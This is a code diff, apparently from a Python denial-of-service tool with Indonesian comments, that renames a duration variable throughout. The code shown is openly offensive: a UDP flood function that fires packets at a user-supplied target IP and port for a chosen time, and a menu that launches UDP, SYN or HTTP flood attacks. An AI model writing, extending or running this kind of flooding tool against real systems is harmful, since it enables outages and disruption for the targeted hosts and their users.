@@ -58,7 +58,7 @@ except ValueError:
 
 # Durasi waktu serangan (second)
 try:
-    dur = int(input("Enter the duration of the attack in seconds: "))
+    duration = int(input("Enter the duration of the attack in seconds: "))
 except ValueError:
     print("Durasi tidak valid. Keluar..")
     sys.exit()
@@ -66,12 +66,12 @@ except ValueError:
 # Fungsi untuk melakukan serangan Banjir UDP
 
 
-def udp_flood(ip, port, message, dur):
+def udp_flood(ip, port, message, duration):
     # Create the UDP socket
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
     # Tetapkan batas waktu untuk soket agar program tidak macet
-    s.settimeout(dur)
+    s.settimeout(duration)
 
     # Alamat IP dan nomor port dari host target
     target = (ip, port)
@@ -90,7 +90,7 @@ def udp_flood(ip, port, message, dur):
             break
 
         # Jika durasi yang ditentukan telah lewat, hentikan loop
-        if time.time() - start_time >= dur:
+        if time.time() - start_time >= duration:
             break
 
     # Close the socket
@@ -155,14 +155,14 @@ attack_type = input((
 if attack_type == "1":
     message = b"Sending 1337 packets baby"
     print(("UDP attack selected", "red"))
-    udp_flood(ip, port, message, dur)
+    udp_flood(ip, port, message, duration)
     print(("UDP attack completed", "red"))
 elif attack_type == "3":
     print(("SYN attack selected", "red"))
-    syn_flood(ip, port, dur)
+    syn_flood(ip, port, duration)
 elif attack_type == "2":
     print(("HTTP attack selected", "red"))
-    http_flood(ip, port, dur)
+    http_flood(ip, port, duration)
 else:
     print(("Invalid attack type. Exiting...", "green"))
     sys.exit()
